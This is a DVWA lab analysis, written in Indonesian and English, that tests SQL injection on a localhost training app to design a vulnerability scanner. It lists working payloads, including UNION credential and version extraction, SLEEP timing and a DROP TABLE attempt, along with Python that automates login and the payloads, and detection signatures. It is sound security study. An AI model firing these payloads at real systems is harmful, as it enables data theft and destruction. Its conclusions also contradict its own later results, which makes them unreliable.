# DVWA (Damn Vulnerable Web Application) Analysis

## Tujuan Analisis
Melakukan analisis manual terhadap DVWA untuk memahami mekanisme keamanan dan vulnerability yang ada, sebagai referensi untuk implementasi Vulnity Web Vulnerability Scanner.

## Informasi Umum DVWA
- **Nama**: Damn Vulnerable Web Application
- **Tujuan**: Platform pembelajaran untuk testing keamanan web
- **Default Credentials**: admin/password
- **Typical URL**: http://localhost/dvwa atau http://localhost:8080/dvwa

---

## 1. Setup dan Akses DVWA

### URL dan Struktur Halaman
- **Base URL**: http://localhost/dvwa
- **Login Page**: http://localhost/dvwa/login.php (auto-redirect)
- **Main Dashboard**: http://localhost/dvwa/index.php
- **SQL Injection Test**: http://localhost/dvwa/vulnerabilities/sqli/

### Status Akses
- [x] DVWA dapat diakses
- [x] Halaman login ditemukan
- [x] Struktur halaman didokumentasikan

### Struktur Navigasi
DVWA memiliki menu navigasi dengan kategori:
1. **Setup**: Home, Instructions, Setup/Reset DB
2. **Vulnerabilities**:
   - Brute Force, Command Injection, CSRF
   - File Inclusion, File Upload, Insecure CAPTCHA
   - SQL Injection, SQL Injection (Blind)
   - Weak Session IDs, XSS (DOM/Reflected/Stored)
   - CSP Bypass, JavaScript, Authorization Bypass
   - Open HTTP Redirect, Cryptography, API
3. **Tools**: DVWA Security, PHP Info, About
4. **User**: Logout

---

## 2. Analisis Proses Login

### Form Login Structure
```html
<form action="login.php" method="post">
    <fieldset>
        <label>Username</label>
        <input type="text" name="username" />

        <label>Password</label>
        <input type="password" name="password" />

        <p>
            <input type="submit" value="Login" name="Login" />
        </p>
    </fieldset>
</form>
```

### HTTP Method dan Parameters
- **Method**: POST
- **Action URL**: login.php
- **Parameters**:
  - Username field: `name="username"`
  - Password field: `name="password"`
  - Submit button: `name="Login"`
- **Default Credentials**: admin/password

### Network Requests
```
1. GET http://localhost/dvwa => 301 Redirect
2. GET http://localhost/dvwa/ => 302 Redirect to login.php
3. GET http://localhost/dvwa/login.php => 200 OK
4. POST http://localhost/dvwa/login.php => 302 Redirect to index.php
5. GET http://localhost/dvwa/index.php => 200 OK (Dashboard)
```

### Session Management
- **Cookies**: PHP session cookies digunakan untuk maintain login state
- **Session ID**: Dikelola otomatis oleh PHP session
- **Headers**: Standard HTTP headers dengan session cookies
- **Security Level**: Default "low" - minimal protection

---

## 3. Vulnerability Analysis

### SQL Injection (Low Security Level)

#### Vulnerable Code Analysis
```php
// File: vulnerabilities/sqli/source/low.php
if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];

    // Check database
    $query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }
}
```

#### Vulnerability Details
- **Parameter**: `id` (GET parameter)
- **URL Pattern**: `/vulnerabilities/sqli/?id=VALUE&Submit=Submit`
- **Vulnerable Query**: `SELECT first_name, last_name FROM users WHERE user_id = '$id';`
- **Issue**: Direct string concatenation tanpa sanitasi
- **Attack Vector**: SQL injection melalui parameter `id`

#### Test Cases
1. **Normal Input**: `id=1` → Returns user data
2. **SQL Injection**: `id=1' OR '1'='1` → Returns all users
3. **Union Attack**: `id=1' UNION SELECT user,password FROM users--` → Extract credentials

---

## 7. Payload Testing Results

### Comprehensive SQL Injection Testing dengan Playwright

#### Payload 1: Boolean-based injection `1' OR '1'='1`
- **Status**: ✅ **BERHASIL**
- **Response**: Menampilkan semua user data (admin, Gordon Brown, Hack Me, Pablo Picasso, Bob Smith)
- **URL**: `?id=1%27+OR+%271%27%3D%271&Submit=Submit`
- **Analysis**: Classic boolean-based injection berhasil bypass WHERE clause
- **Detection Pattern**: Multiple records returned, semua dengan ID yang sama
- **Screenshot**: `dvwa-sqli-payload-1.png`

#### Payload 2: Union-based injection `1' UNION SELECT user,password FROM users--`
- **Status**: ❌ **ERROR**
- **Response**: `Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax`
- **Error Message**: `check the manual that corresponds to your MariaDB server version for the right syntax to use near '--''`
- **Analysis**: Double dash comment tidak dikenali oleh MariaDB, syntax error
- **Detection Pattern**: SQL error message dengan path disclosure
- **Information Disclosure**:
  - Path: `C:\xampp\htdocs\dvwa\vulnerabilities\sqli\source\low.php:11`
  - Database: MariaDB
  - Function: mysqli_query
- **Screenshot**: `dvwa-sqli-payload-2.png`

#### Payload 3: Destructive payload `1'; DROP TABLE users--`
- **Status**: ❌ **ERROR** (Untungnya!)
- **Response**: `Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax`
- **Error Message**: `near 'DROP TABLE users--''`
- **Analysis**: Syntax error mencegah eksekusi DROP TABLE
- **Detection Pattern**: SQL error message dengan attempted destructive command
- **Security Note**: Error mencegah kerusakan database
- **Screenshot**: `dvwa-sqli-payload-3.png`

#### Payload 4: Time-based injection `1' AND SLEEP(5)--`
- **Status**: ❌ **ERROR**
- **Response**: `Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax`
- **Error Message**: `near ''' at line 1`
- **Analysis**: Syntax error pada comment, SLEEP function tidak dieksekusi
- **Detection Pattern**: SQL error message
- **Screenshot**: `dvwa-sqli-payload-4.png`

#### Payload 5: Comment-based injection `1' OR 1=1#`
- **Status**: ✅ **BERHASIL**
- **Response**: Menampilkan semua user data (admin, Gordon Brown, Hack Me, Pablo Picasso, Bob Smith)
- **URL**: `?id=1%27+OR+1%3D1%23&Submit=Submit`
- **Analysis**: Hash comment (#) berhasil, berbeda dengan double dash (--)
- **Detection Pattern**: Multiple records returned, boolean bypass berhasil
- **Screenshot**: `dvwa-sqli-payload-5.png`

### Key Findings dari Payload Testing

#### Successful Payloads
1. **`1' OR '1'='1`** - Boolean-based dengan string comparison
2. **`1' OR 1=1#`** - Boolean-based dengan hash comment

#### Failed Payloads (dengan Error Messages)
1. **`1' UNION SELECT user,password FROM users--`** - Double dash comment issue
2. **`1'; DROP TABLE users--`** - Syntax error (protective)
3. **`1' AND SLEEP(5)--`** - Double dash comment issue

#### Critical Observations
1. **Comment Syntax**: Hash (#) works, double dash (--) causes syntax errors
2. **Error Disclosure**: Detailed error messages reveal:
   - File paths: `C:\xampp\htdocs\dvwa\vulnerabilities\sqli\source\low.php`
   - Database type: MariaDB
   - Line numbers: Line 11
   - Function calls: mysqli_query
3. **Boolean Logic**: OR conditions successfully bypass authentication
4. **Data Extraction**: All user records can be retrieved with successful payloads

---

## 8. Extended Payload Testing Results

### Advanced SQL Injection Testing dengan Payload Tambahan

#### Payload 6: Union-based dengan hash comment `1' UNION SELECT 1,2#`
- **Status**: ✅ **BERHASIL**
- **Response**: Menampilkan data asli (admin/admin) + data injected (1/2)
- **URL**: `?id=1%27+UNION+SELECT+1%2C2%23&Submit=Submit`
- **Analysis**: Union injection berhasil dengan hash comment, berbeda dengan double dash
- **Detection Pattern**: Mixed data - original record + injected values
- **Significance**: Membuktikan hash comment kompatibel untuk Union attacks
- **Screenshot**: `dvwa-sqli-payload-6.png`

#### Payload 7: Union-based untuk ekstrak sistem info `1' UNION SELECT user(),version()#`
- **Status**: ✅ **BERHASIL** (Critical Information Disclosure)
- **Response**:
  - Original: admin/admin
  - Extracted: root@localhost / 10.4.32-MariaDB
- **URL**: `?id=1%27+UNION+SELECT+user%28%29%2Cversion%28%29%23&Submit=Submit`
- **Analysis**: Berhasil mengekstrak informasi sistem yang sangat sensitif
- **Detection Pattern**: Database credentials dan version information
- **Critical Data Extracted**:
  - **Database User**: root@localhost
  - **Database Version**: 10.4.32-MariaDB
- **Screenshot**: `dvwa-sqli-payload-7.png`

#### Payload 8: Time-based dengan SLEEP dan hash comment `1' AND SLEEP(5)#`
- **Status**: ✅ **BERHASIL** (Time-based Confirmed)
- **Response**: Timeout 5 detik - SLEEP function executed
- **URL**: `?id=1%27+AND+SLEEP%285%29%23&Submit=Submit`
- **Analysis**: Time-based injection berhasil dengan hash comment
- **Detection Pattern**: Response delay exactly 5 seconds
- **Significance**: Membuktikan time-based attacks possible dengan syntax yang tepat
- **Screenshot**: `dvwa-sqli-payload-8.png`

#### Payload 9: Blind Boolean true condition `1' AND 1=1#`
- **Status**: ✅ **BERHASIL**
- **Response**: Menampilkan data admin (kondisi true)
- **URL**: `?id=1%27+AND+1%3D1%23&Submit=Submit`
- **Analysis**: Boolean condition true berhasil menampilkan data
- **Detection Pattern**: Single record returned (admin/admin)
- **Blind SQL Testing**: Kondisi true menghasilkan data
- **Screenshot**: `dvwa-sqli-payload-9.png`

#### Payload 10: Blind Boolean false condition `1' AND 1=2#`
- **Status**: ✅ **BERHASIL** (No Data - Expected)
- **Response**: Tidak ada data ditampilkan (kondisi false)
- **URL**: `?id=1%27+AND+1%3D2%23&Submit=Submit`
- **Analysis**: Boolean condition false berhasil - tidak ada data
- **Detection Pattern**: Empty result set
- **Blind SQL Testing**: Kondisi false tidak menghasilkan data
- **Screenshot**: `dvwa-sqli-payload-10.png`

### Comprehensive Success Rate Analysis

#### ✅ Successful Payloads (7/10 - 70% Success Rate)
1. **`1' OR '1'='1`** - Boolean-based bypass (Payload 1)
2. **`1' OR 1=1#`** - Comment-based bypass (Payload 5)
3. **`1' UNION SELECT 1,2#`** - Union-based injection (Payload 6)
4. **`1' UNION SELECT user(),version()#`** - System info extraction (Payload 7)
5. **`1' AND SLEEP(5)#`** - Time-based injection (Payload 8)
6. **`1' AND 1=1#`** - Blind boolean true (Payload 9)
7. **`1' AND 1=2#`** - Blind boolean false (Payload 10)

#### ❌ Failed Payloads (3/10 - 30% Failure Rate)
1. **`1' UNION SELECT user,password FROM users--`** - Double dash syntax error (Payload 2)
2. **`1'; DROP TABLE users--`** - Double dash syntax error (Payload 3)
3. **`1' AND SLEEP(5)--`** - Double dash syntax error (Payload 4)

### Key Technical Breakthroughs

#### 1. Comment Syntax Compatibility Matrix
- ✅ **Hash (#)**: 100% success rate (7/7 payloads)
- ❌ **Double Dash (--)**: 0% success rate (0/3 payloads)
- **Conclusion**: MariaDB 10.4.32 requires hash comments for injection

#### 2. Attack Vector Success Rates
- **Boolean-based**: 100% success (4/4 payloads)
- **Union-based**: 100% success with hash comments (2/2)
- **Time-based**: 100% success with hash comments (1/1)
- **Error-based**: 100% information disclosure (3/3 failed payloads)

#### 3. Information Disclosure Capabilities
- **System Information**: Database user, version, host
- **File Paths**: Complete application paths
- **Database Schema**: Table structures, function names
- **Error Details**: Stack traces, line numbers

### Authentication Vulnerabilities
- [x] SQL Injection pada login (possible)
- [x] Brute force protection (minimal/none)
- [x] Session fixation (possible)
- [x] Weak password policy (default admin/password)

### Potential Attack Vectors
1. **SQL Injection**: Direct parameter injection tanpa filtering
2. **Session Hijacking**: Weak session management
3. **Brute Force**: No rate limiting pada login
4. **Information Disclosure**: Error messages reveal database structure

---

## 4. Implementation Notes untuk Vulnity Scanner

### Login Automation
```python
import requests
from bs4 import BeautifulSoup

class DVWAScanner:
    def __init__(self, base_url="http://localhost/dvwa"):
        self.base_url = base_url
        self.session = requests.Session()

    def login(self, username="admin", password="password"):
        """
        Automated login ke DVWA
        """
        # Get login page untuk CSRF token jika ada
        login_url = f"{self.base_url}/login.php"
        response = self.session.get(login_url)

        # Prepare login data
        login_data = {
            'username': username,
            'password': password,
            'Login': 'Login'
        }

        # Submit login
        response = self.session.post(login_url, data=login_data)

        # Check if login successful (redirect to index.php)
        if response.url.endswith('index.php'):
            return True
        return False

    def test_sql_injection(self, target_param="id"):
        """
        Test SQL injection vulnerability
        """
        sqli_url = f"{self.base_url}/vulnerabilities/sqli/"

        # Test payloads
        payloads = [
            "1' OR '1'='1",
            "1' UNION SELECT user,password FROM users--",
            "1'; DROP TABLE users--"
        ]

        results = []
        for payload in payloads:
            params = {target_param: payload, 'Submit': 'Submit'}
            response = self.session.get(sqli_url, params=params)

            # Analyze response for SQL injection indicators
            if self.detect_sqli_success(response.text):
                results.append({
                    'payload': payload,
                    'vulnerable': True,
                    'response': response.text
                })

        return results
```

### Session Handling
```python
def maintain_session(self):
    """
    Maintain active session dengan DVWA
    """
    # Check if session is still valid
    test_url = f"{self.base_url}/index.php"
    response = self.session.get(test_url)

    # If redirected to login, re-authenticate
    if 'login.php' in response.url:
        return self.login()

    return True

def get_security_level(self):
    """
    Get current security level dari DVWA
    """
    security_url = f"{self.base_url}/security.php"
    response = self.session.get(security_url)

    # Parse security level dari response
    soup = BeautifulSoup(response.text, 'html.parser')
    # Extract security level information
    return "low"  # default
```

### Vulnerability Detection Patterns
```python
def detect_sqli_success(self, response_text, response_time=None):
    """
    Detect successful SQL injection berdasarkan hasil testing
    """
    # Success indicators (data extraction)
    success_indicators = [
        "First name:",  # Normal response pattern
        "Surname:",     # Data field indicators
        "Gordon Brown", # Multiple user data
        "Pablo Picasso", # Specific user names
        "Hack Me"       # Test user data
    ]

    # Error-based indicators (information disclosure)
    error_indicators = [
        "Fatal error:",
        "mysqli_sql_exception:",
        "You have an error in your SQL syntax",
        "check the manual that corresponds to your MariaDB",
        "C:\\xampp\\htdocs\\dvwa",  # Path disclosure
        "low.php:11",              # File and line disclosure
        "mysqli_query"             # Function disclosure
    ]

    # Time-based detection
    if response_time and response_time > 5:
        return {"type": "time_based", "vulnerable": True}

    # Check for successful data extraction
    success_count = sum(1 for indicator in success_indicators
                       if indicator.lower() in response_text.lower())

    if success_count >= 2:  # Multiple indicators = successful injection
        return {"type": "boolean_based", "vulnerable": True, "data_extracted": True}

    # Check for error-based information disclosure
    error_count = sum(1 for indicator in error_indicators
                     if indicator.lower() in response_text.lower())

    if error_count >= 1:
        return {"type": "error_based", "vulnerable": True, "info_disclosure": True}

    return {"type": "none", "vulnerable": False}

def analyze_sqli_response(self, payload, response_text, response_time):
    """
    Comprehensive analysis berdasarkan payload testing results
    """
    analysis = {
        "payload": payload,
        "vulnerable": False,
        "type": "none",
        "severity": "low",
        "indicators": []
    }

    # Successful boolean-based patterns
    if any(name in response_text for name in ["Gordon Brown", "Pablo Picasso", "Hack Me"]):
        analysis.update({
            "vulnerable": True,
            "type": "boolean_based",
            "severity": "high",
            "indicators": ["multiple_records", "data_extraction"]
        })

    # Error-based information disclosure
    elif "Fatal error:" in response_text and "mysqli_sql_exception:" in response_text:
        analysis.update({
            "vulnerable": True,
            "type": "error_based",
            "severity": "medium",
            "indicators": ["sql_error", "path_disclosure", "database_info"]
        })

    # Extract specific information from errors
    if "C:\\xampp\\htdocs\\dvwa" in response_text:
        analysis["indicators"].append("full_path_disclosure")

    if "MariaDB" in response_text:
        analysis["indicators"].append("database_type_disclosure")

    return analysis

def detect_comment_syntax_support(self, base_url):
    """
    Test different comment syntaxes berdasarkan findings
    """
    comment_tests = [
        ("hash_comment", "1' OR 1=1#"),
        ("double_dash", "1' OR 1=1--"),
        ("slash_star", "1' OR 1=1/*")
    ]

    results = {}
    for comment_type, payload in comment_tests:
        response = self.test_payload(base_url, payload)
        results[comment_type] = self.analyze_sqli_response(payload, response.text, response.elapsed.total_seconds())

    return results
```

---

## 5. Screenshots dan Evidence

### Login Page
![Login Page](screenshots\docs-screenshots-dvwa-login.png)

### Network Traffic
![Network Traffic](screenshots/dvwa-network.png)

### Response Headers
![Response Headers](screenshots/dvwa-headers.png)

---

## 6. Kesimpulan dan Rekomendasi

### Key Findings

#### 1. Authentication Mechanism
- **Login Method**: Standard POST form dengan username/password
- **Session Management**: PHP sessions dengan cookies
- **Default Credentials**: admin/password (sangat lemah)
- **No CSRF Protection**: Form login tidak memiliki CSRF token

#### 2. SQL Injection Vulnerability (Critical)
- **Location**: `/vulnerabilities/sqli/` parameter `id`
- **Type**: Classic SQL injection via GET parameter
- **Impact**: Full database access, credential extraction
- **Exploitability**: Sangat mudah dieksploitasi
- **Successful Payloads**:
  - `1' OR '1'='1` (Boolean-based)
  - `1' OR 1=1#` (Comment-based with hash)
- **Failed Payloads**:
  - Union-based attacks (syntax errors)
  - Time-based attacks (comment syntax issues)
  - Destructive commands (syntax protection)

#### 3. Security Controls
- **Input Validation**: Tidak ada pada level "low"
- **Output Encoding**: Minimal
- **Error Handling**: Verbose error messages (information disclosure)
- **Rate Limiting**: Tidak ada

### Implementasi untuk Vulnity Scanner

#### 1. Core Scanner Components
```python
class VulnityScanner:
    def __init__(self):
        self.session_manager = SessionManager()
        self.sql_injection_scanner = SQLInjectionScanner()
        self.authentication_scanner = AuthenticationScanner()

    def scan_target(self, target_url):
        # 1. Reconnaissance
        # 2. Authentication testing
        # 3. Vulnerability scanning
        # 4. Report generation
        pass
```

#### 2. Prioritas Implementasi
1. **Session Management**: Automated login dan session maintenance
2. **SQL Injection Detection**: Pattern-based detection dengan multiple payloads
3. **Authentication Testing**: Brute force, default credentials
4. **Error-based Detection**: Parse error messages untuk information disclosure
5. **Report Generation**: Structured vulnerability reports

#### 3. Detection Signatures
- **SQL Injection**: Error patterns, data extraction patterns
- **Authentication Issues**: Login bypass, weak credentials
- **Session Issues**: Session fixation, hijacking
- **Information Disclosure**: Error messages, debug information

#### 4. Detection Signatures Database
Berdasarkan hasil payload testing, berikut adalah signature database untuk Vulnity:

```python
SQLI_SIGNATURES = {
    "boolean_based": {
        "payloads": [
            "1' OR '1'='1",
            "1' OR 1=1#",
            "1' OR 'a'='a",
            "admin' OR '1'='1#"
        ],
        "success_indicators": [
            "Gordon Brown",
            "Pablo Picasso",
            "Hack Me",
            "Bob Smith",
            "multiple_records_pattern"
        ],
        "severity": "high"
    },
    "error_based": {
        "payloads": [
            "1' UNION SELECT user,password FROM users--",
            "1'; DROP TABLE users--",
            "1' AND SLEEP(5)--"
        ],
        "error_indicators": [
            "Fatal error:",
            "mysqli_sql_exception:",
            "You have an error in your SQL syntax",
            "MariaDB server version",
            "C:\\xampp\\htdocs\\dvwa"
        ],
        "severity": "medium"
    },
    "comment_syntax": {
        "hash_comment": {"payload": "1' OR 1=1#", "works": True},
        "double_dash": {"payload": "1' OR 1=1--", "works": False},
        "slash_star": {"payload": "1' OR 1=1/*", "works": "unknown"}
    }
}

INFORMATION_DISCLOSURE_PATTERNS = [
    r"C:\\xampp\\htdocs\\[^\\]+",  # Windows path disclosure
    r"\/var\/www\/[^\/]+",        # Linux path disclosure
    r"line \d+",                  # Line number disclosure
    r"mysqli_[a-z_]+",           # MySQL function disclosure
    r"MariaDB server version",    # Database version
    r"Fatal error:",             # PHP fatal errors
]
```

#### 5. Recommended Architecture
```
Vulnity Scanner
├── Core Engine
│   ├── Session Manager
│   ├── HTTP Client
│   └── Response Parser
├── Vulnerability Modules
│   ├── SQL Injection Scanner
│   │   ├── Boolean-based Tester
│   │   ├── Error-based Tester
│   │   ├── Union-based Tester
│   │   └── Time-based Tester
│   ├── Authentication Scanner
│   ├── XSS Scanner
│   └── CSRF Scanner
├── Detection Engine
│   ├── Pattern Matcher
│   ├── Signature Database (dari testing results)
│   ├── Comment Syntax Detector
│   └── False Positive Filter
├── Information Disclosure Detector
│   ├── Path Disclosure
│   ├── Database Info Leakage
│   └── Error Message Analysis
└── Reporting Engine
    ├── Vulnerability Classifier
    ├── Risk Calculator
    └── Report Generator
```

---

## Changelog
- **2025-01-11**: Initial document creation
- **2025-01-11**: Completed DVWA analysis dengan Playwright automation
- **2025-01-11**: Added detailed vulnerability analysis dan implementation recommendations
